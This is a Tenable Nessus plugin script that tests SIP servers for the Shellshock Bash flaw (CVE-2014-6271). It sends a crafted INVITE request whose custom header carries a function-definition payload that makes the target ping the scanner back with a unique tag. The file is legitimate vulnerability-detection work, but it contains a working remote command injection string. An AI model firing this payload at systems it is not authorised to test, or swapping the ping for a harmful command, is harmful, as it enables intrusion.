#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(78822);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/04/25 20:29:05 $");

  script_cve_id("CVE-2014-6271");
  script_bugtraq_id(70103);
  script_osvdb_id(112004);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");
  script_xref(name:"EDB-ID", value:"34860");

  script_name(english:"SIP Script Remote Command Execution via Shellshock");
  script_summary(english:"Attempts to run a command remotely via a specially crafted SIP INVITE request.");

  script_set_attribute(attribute:"synopsis", value:
"The remote SIP server uses scripts that allow remote command execution
via Shellshock.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running SIP. SIP itself is not
vulnerable to Shellshock; however, any Bash script that SIP runs for
filtering or other routing tasks could potentially be affected if the
script exports an environmental variable from the content or headers
of a SIP message.

A negative result from this plugin does not prove conclusively that
the remote system is not affected by Shellshock, only that any scripts
the SIP proxy may be running do not create the conditions that are
exploitable via the Shellshock flaw.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:
"Apply the referenced Bash patch or remove the affected SIP scripts /
modules.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/11/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"General");
  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("sip_detection.nasl");
  script_require_keys("Settings/ThoroughTests");
  script_require_ports("Services/sip", 5060);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("byte_func.inc");
include("misc_func.inc");
include("smtp_func.inc");

if (! thorough_tests ) audit(AUDIT_THOROUGH);

port = get_service(svc:"sip", ipproto:"udp", default:5060, exit_on_fail:1);

# Open connection to SIP.
soc = open_sock_udp(port);

if (!soc) audit(AUDIT_SOCK_FAIL,"SIP",port);

#
# setup unique id for pingback
#
id_tag = hexstr(rand_str(length:10));

#
# build INVITE request
#
raddress = get_host_ip();
laddress = this_host();
rn = raw_string(0x0d, 0x0a);

data = "INVITE sip:nessus@" + raddress + " SIP/2.0" + rn +
"Via: SIP/2.0/UDP " + laddress + ":5062;branch=z9hG4bK23000023" + rn +
'From: \"Nessus\" <sip:nessus@' + raddress + ">;tag=999888777" + rn +
"To: <sip:@" + raddress + ">" + rn +
"Call-ID: 23@" + laddress + rn +
"CSeq: 1 INVITE" + rn +
"Contact: <sip:nessus@" + laddress + ":5062>" + rn +
"Content-Type: application/sdp" + rn +
"Max-Forwards: 13" + rn +
"User-Agent: NESSUS" + rn +
"SHELLSHOCK: () { :;}; ping -c 10 -p '" + string(id_tag) + "' " + laddress + rn +
"Content-Length: 0" + rn + rn;

#
# send SIP INVITE
#

# See if we get a response
filter = "icmp and icmp[0] = 8 and src host " + raddress;
s = send_capture(socket:soc, data:data, pcap_filter:filter);
s = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
close(soc);

# No response, meaning we didn't get in
if(isnull(s) || id_tag >!< s) audit(AUDIT_LISTEN_NOT_VULN,"SIP",port);

report = NULL;

if (report_verbosity > 0)
{
  report =
    '\n' + 'Nessus was able to exploit CVE-2014-6271 (Shellshock) using a specially' +
    '\n' + 'crafted INVITE request.' +
    '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port:port);
